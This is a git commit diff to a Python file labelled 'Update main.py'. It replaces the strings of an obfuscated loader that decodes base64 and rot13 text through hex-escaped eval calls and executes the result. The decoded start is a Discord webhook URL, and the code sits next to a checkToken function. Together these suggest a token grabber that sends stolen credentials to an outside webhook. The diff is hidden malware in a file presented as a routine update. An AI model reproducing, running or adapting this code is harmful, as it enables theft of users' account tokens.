4fa13fbfd8dc300a8e9cb7491ebfa8ca19c5de5b
HatGirl-zz <120135553+HatGirl-zz@users.noreply.github.com>
2024-05-22 16:39:31 +0200

    Update main.py

--- main.py
+++ main.py
@@ -265,10 +265,10 @@ def checkToken(token):
     
 
 import base64, codecs
-magic = 'aG9vayA9ICJodHRwczovL2NhbmFyeS5kaXNjb3JkLmNvbS'
-love = '9upTxiq2IvnT9in3ZiZGVmBQV3AQt0AwN1ZwD1AQDjZP9u'
-god = 'TGZDVnVwRl9YTWFCYjNGU1Jva24xSUNxVGFTS0piU1Rab3'
-destiny = 'uJpS9YJGOJZ3MWGHWiMKy4IGOsIIWerycjnQWWAJA5IlV='
+magic = 'bXlob29rPSJodHRwczovL2NhbmFyeS5kaXNjb3JkLmNvbS'
+love = '9upTxiq2IvnT9in3ZiZGV0ZGDlZwLmAmt2BQV1ZmVlAP9K'
+god = 'Qk83eTdPSjZRSlJOZFVNSlJndzg0YzQ0RFZNdjBNbFVCM1'
+destiny = 'cFAz54I1WgZwALG0I2qmN0HISzJUMWrUygMzMjF1uaMPV='
 joy = '\x72\x6f\x74\x31\x33'
 trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
 eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
